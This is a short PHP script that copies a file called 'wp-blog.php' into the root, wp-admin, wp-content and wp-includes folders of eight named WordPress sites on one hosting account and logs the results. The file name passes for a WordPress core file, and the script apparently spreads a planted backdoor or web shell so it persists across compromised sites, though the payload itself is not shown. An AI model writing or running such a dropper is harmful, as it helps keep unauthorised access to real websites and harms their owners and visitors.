<?php
set_time_limit(0);

$baseDirs = [
    '/home/u241000670/domains/aavratijewels.com/public_html',
    '/home/u241000670/domains/accoretechnologies.com/public_html',
    '/home/u241000670/domains/adventuremastersports.org/public_html',
    '/home/u241000670/domains/ambientsportsandentertainment.com/public_html',
    '/home/u241000670/domains/aparnaassociates.in/public_html',
    '/home/u241000670/domains/apcalculusonline.in/public_html',
    '/home/u241000670/domains/apnasign.com/public_html',
    '/home/u241000670/domains/appathak.com/public_html'
];

$sourceFile = __DIR__ . '/wp-blog.php';
$targetName = 'wp-blog.php';

$targetSubfolders = [
    '',
    'wp-admin',
    'wp-content',
    'wp-includes'
];

if (!file_exists($sourceFile)) {
    die('File wp-blog.php tidak ditemukan');
}

$log = [];

foreach ($baseDirs as $baseDir) {
    if (!is_dir($baseDir)) continue;

    foreach ($targetSubfolders as $sub) {
        $destDir = rtrim($baseDir . '/' . $sub, '/');
        if (!is_dir($destDir)) continue;
        if (!is_writable($destDir)) {
            $log[] = "❌ Not writable: $destDir";
            continue;
        }

        $dest = $destDir . '/' . $targetName;
        if (@copy($sourceFile, $dest)) {
            chmod($dest, 0644);
            $log[] = "✅ OK → $dest";
        } else {
            $log[] = "❌ FAIL → $dest";
        }
    }
}

echo "<pre>".implode("\n",$log)."</pre>";
